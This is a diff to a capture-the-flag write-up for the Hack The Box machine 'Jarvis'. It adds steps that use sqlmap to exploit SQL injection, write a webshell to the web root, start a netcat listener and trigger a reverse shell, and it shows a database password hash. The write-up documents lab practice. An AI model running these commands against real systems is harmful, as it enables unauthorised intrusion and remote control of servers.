@@ -213,7 +213,7 @@ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 
 
 
-## Exploitation: Method 2
+## Exploitation: Method 2 - sqlmap
 + Run: `sqlmap -u "http://10.10.10.143/room.php?cod=5" --batch --dbs`
 + At this point, SQLmap fails. If we go to the website, we receive the message **"Hey you have been banned for 90 seconds, don't be bad"**.
 + Not only that, but the site now returns the previous same message on port 64999 about being blocked for 90 seconds.
@@ -282,9 +282,16 @@ database management system users password hashes:
 
 
 
-## Gaining Access: Method 2
-+ 
+## Gaining Access: Method 2 - sqlmap
++ Do the same phpmyadmin attack as shown [above](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#gaining-access-method-1). using sqlmap to write a webshell:
+```
+sqlmap -u http://10.10.10.143:80/room.php?cod=5 --batch --dbs --random-agent --file-write shell.php --file-dest /var/www/html/shell.php
+```
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9603124c-8060-478b-95da-652e53e2752b)
+
++ Start a netcat listener on the attack machine: `nc -lnvp 4444`
++ Get the shell: `curl http://10.10.10.143/shell.php`
 
 
 ## Gaining Access: Method 3 - sqlmap
